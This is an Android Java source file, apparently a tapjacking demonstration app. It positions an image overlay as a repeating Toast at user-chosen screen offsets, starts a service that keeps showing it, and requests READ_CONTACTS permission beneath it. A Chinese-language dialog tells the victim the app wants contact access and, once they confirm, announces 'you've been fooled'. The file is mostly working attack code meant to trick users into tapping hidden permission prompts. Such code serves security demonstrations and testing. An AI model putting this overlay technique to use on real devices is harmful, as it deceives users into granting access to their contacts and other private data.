package com.example.tapjacking_android;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.content.DialogInterface;
import android.content.Intent;
import android.graphics.Point;
import android.graphics.drawable.BitmapDrawable;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.RequiresApi;
import android.util.Log;
import android.view.Display;
import android.view.Gravity;
import android.view.Menu;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.SeekBar;
import android.widget.SeekBar.OnSeekBarChangeListener;
import android.widget.Toast;

import static android.widget.Toast.*;

public class MainActivity extends Activity {

    private static final int PERMISSIONS_REQUEST_CODE = 123;

    private static int SEEK_MAX = 100;

    private Intent service;

    // UI elements
    SeekBar left;
    SeekBar top;
    EditText repRate;

    // seekbar change listener
    OnSeekBarChangeListener positionListner;

    // phone display dimensions
    int width, height;

    @SuppressWarnings("deprecation")
    @SuppressLint("NewApi")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // get the dimensions of the tapjacking image
        BitmapDrawable bd = (BitmapDrawable) this.getResources().getDrawable(
                R.drawable.ic_terms_message);
        int h = bd.getBitmap().getHeight();
        int w = bd.getBitmap().getWidth();

        Display display = getWindowManager().getDefaultDisplay();

        if (android.os.Build.VERSION.SDK_INT > android.os.Build.VERSION_CODES.HONEYCOMB_MR2) {
            Point size = new Point();
            display.getSize(size);
            width = size.x - w;
            height = size.y - h;
        } else {
            // getSize was introduced in API 13, so all previous builds need the
            // deprecated getWidth and getHeight functions
            width = display.getWidth() - w;
            height = display.getHeight() - h;

        }
        Button button = findViewById(R.id.button);
        button.setOnClickListener(new View.OnClickListener(){
            @RequiresApi(api = Build.VERSION_CODES.M)
            @Override
            public void onClick(View v){
                requestPermissions(new String[]{Manifest.permission.READ_CONTACTS},PERMISSIONS_REQUEST_CODE);
            }
        });
        // instantiate UI elements
        left = (SeekBar) findViewById(R.id.seekLeftOffset);
        top = (SeekBar) findViewById(R.id.seekTopOffset);
        repRate = (EditText) findViewById(R.id.edtRepetionRate);

        // define the actions to be performed when a user interacts with the
        // seekbar
        positionListner = new OnSeekBarChangeListener() {
            Toast temp = new Toast(getApplicationContext());
            ImageView img = new ImageView(getApplicationContext());

            @Override
            public void onStopTrackingTouch(SeekBar seekBar) {
                img.setImageResource(R.drawable.ic_terms_message);
                temp.setView(img);
                temp.setDuration(LENGTH_SHORT);
                temp.setGravity(Gravity.TOP | Gravity.LEFT,
                        (int) (left.getProgress() * width / (SEEK_MAX)),
                        (int) (top.getProgress() * height / (SEEK_MAX)));
                temp.show();
            }

            @Override
            public void onStartTrackingTouch(SeekBar seekBar) {
                // when they start moving the image, cancel the old display
                temp.cancel();
                stopService(service);

            }

            @Override
            public void onProgressChanged(SeekBar seekBar, int progress,
                                          boolean fromUser) {
                // do nothing, nobody cares
            }
        };

        // set the seekbar listener to both the left and top bars
        left.setOnSeekBarChangeListener(positionListner);
        top.setOnSeekBarChangeListener(positionListner);

        // start a new intent for the ToastService
        service = new Intent(this, ToastService.class);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    /**
     * Start the Tapjacking Service
     *
     * @param view
     */

    @SuppressLint("NewApi")
    public void startTJService(View view) {
        // try and get the repetition period specified by the user, if the value
        // entered is not a valid number, log the error
        int rep = 15000;
        try {
            rep = Integer.parseInt(repRate.getText().toString()) * 1000;
        } catch (Exception e) {
            Log.w("_com_example_tapjacking",
                    "Failed to convert repetion value to a number, using default value");
            rep=15000;
        }
        service.putExtra("_com_example_tapjacking_topOffset",
                (int) (top.getProgress() * height / (SEEK_MAX)));
        service.putExtra("_com_example_tapjacking_leftOffset",
                (int) (left.getProgress() * width / (SEEK_MAX)));
        service.putExtra("_com_example_tapjacking_repetitionTime", rep);

        this.startService(service);
        AlertDialog.Builder bb = new AlertDialog.Builder(this);
        bb.setPositiveButton("confrim",new DialogInterface.OnClickListener(){
            public void onClick(DialogInterface arg0,int arg1){
                Toast t = (Toast) Toast.makeText(getApplicationContext(),"你上当了!!",Toast.LENGTH_LONG);
                t.show();
                arg0.dismiss();
            }
        });
        final AlertDialog dialog = bb.create();
        WindowManager.LayoutParams lp = dialog.getWindow().getAttributes();
        lp.alpha=1.0f;
        dialog.getWindow().setAttributes(lp);
        bb.setMessage("应用Tap_jacking正在申请联系人权限");
        bb.setTitle("权限获取");
        dialog.show();

    }

    /**
     * Stop the Tapjacking Service
     *
     * @param view
     */
    public void stopTJService(View view) {
        this.stopService(service);
    }

}
